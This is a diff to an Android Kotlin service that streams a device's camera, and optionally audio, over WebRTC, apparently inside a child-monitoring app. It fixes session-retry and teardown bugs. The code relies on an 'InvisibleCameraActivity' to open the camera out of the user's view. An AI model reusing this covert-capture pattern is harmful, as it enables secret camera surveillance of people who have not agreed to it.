@@ -46,6 +46,16 @@ class CameraStreamService : Service() {
             return START_NOT_STICKY
         }
 
+        // If a previous camera WebRTC manager is still active (e.g. during a rapid retry),
+        // release it cleanly before opening the camera again.
+        cameraWebRtcManager?.let { oldRtc ->
+            Log.i(TAG, "Releasing previous CameraWebRtcManager before starting new session $sid")
+            cameraWebRtcManager = null
+            try {
+                oldRtc.release()
+            } catch (_: Exception) {}
+        }
+
         sessionId = sid
         currentSessionId = sid
         isSessionRunning.set(true)
@@ -91,8 +101,6 @@ class CameraStreamService : Service() {
             }
         }
 
-        InvisibleCameraActivity.onCameraInitialized?.invoke()
-
         val activeSock = ChildMonitoringService.activeSocket
         val isShared = activeSock != null && activeSock.isConnected
         val socket = if (isShared) {
@@ -103,9 +111,6 @@ class CameraStreamService : Service() {
             SocketManager(token).also { socketManager = it }
         }
 
-        socket.onCameraStreamStopped = { stoppedId ->
-            if (stoppedId == sessionId) stopStreaming()
-        }
         socket.onCameraStreamSwitchCamera = { switchSid, _ ->
             if (switchSid == sessionId) {
                 cameraWebRtcManager?.switchCamera()
@@ -140,7 +145,7 @@ class CameraStreamService : Service() {
                 if (state == PeerConnection.PeerConnectionState.CLOSED ||
                     state == PeerConnection.PeerConnectionState.FAILED
                 ) {
-                    if (!isStopping.get()) {
+                    if (!isStopping.get() && sessionId == sid) {
                         Log.i(TAG, "Stopping camera stream due to connection state: $state")
                         stopStreaming()
                     }
@@ -150,6 +155,9 @@ class CameraStreamService : Service() {
                 Log.e(TAG, "Camera streaming error: $reason")
                 socket.rejectCameraStream(sid, reason)
                 stopStreaming()
+            },
+            onFirstFrame = {
+                InvisibleCameraActivity.onCameraInitialized?.invoke()
             }
         ).also { cameraWebRtcManager = it }
         webRtc.init()
@@ -163,37 +171,26 @@ class CameraStreamService : Service() {
                 withAudio = actualWithAudio,
                 iceServers = iceServers
             )
+            // Fallback trigger in case onFirstFrame takes slightly longer
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                InvisibleCameraActivity.onCameraInitialized?.invoke()
+            }, 1200)
         }
 
-        // Fetch server ICE configuration asynchronously in background thread
-        Thread {
-            val iceServers = try {
-                val api = ApiClient(SessionStore(applicationContext))
-                val config = api.getIceServers()
-                parseIceServers(config)
-            } catch (_: Exception) {
-                defaultIceServers
-            }
-            val finalIce = if (iceServers.isNotEmpty()) iceServers else defaultIceServers
-
-            android.os.Handler(android.os.Looper.getMainLooper()).post {
-                if (cameraWebRtcManager != null && !isStopping.get()) {
-                    if (socket.isConnected) {
-                        beginCapture(finalIce)
-                    } else {
-                        Log.i(TAG, "Socket not yet connected, waiting for onConnected...")
-                        socket.onConnected = {
-                            android.os.Handler(android.os.Looper.getMainLooper()).post {
-                                if (cameraWebRtcManager != null && !isStopping.get()) {
-                                    beginCapture(finalIce)
-                                }
-                            }
-                        }
-                        socket.connect()
+        // Start camera capture immediately while InvisibleCameraActivity is in foreground!
+        if (socket.isConnected) {
+            beginCapture(defaultIceServers)
+        } else {
+            Log.i(TAG, "Socket not yet connected, waiting for onConnected...")
+            socket.onConnected = {
+                android.os.Handler(android.os.Looper.getMainLooper()).post {
+                    if (cameraWebRtcManager != null && !isStopping.get() && sessionId == sid) {
+                        beginCapture(defaultIceServers)
                     }
                 }
             }
-        }.start()
+            socket.connect()
+        }
 
         return START_STICKY
     }
@@ -217,6 +214,12 @@ class CameraStreamService : Service() {
             } catch (_: Exception) {
                 // best-effort
             }
+        }
+        val activeSock = ChildMonitoringService.activeSocket
+        if (socketManager == null && activeSock != null) {
+            activeSock.onWebrtcAnswer = null
+            activeSock.onIceCandidate = null
+            activeSock.onCameraStreamSwitchCamera = null
         }
         socketManager?.disconnect()
         socketManager = null
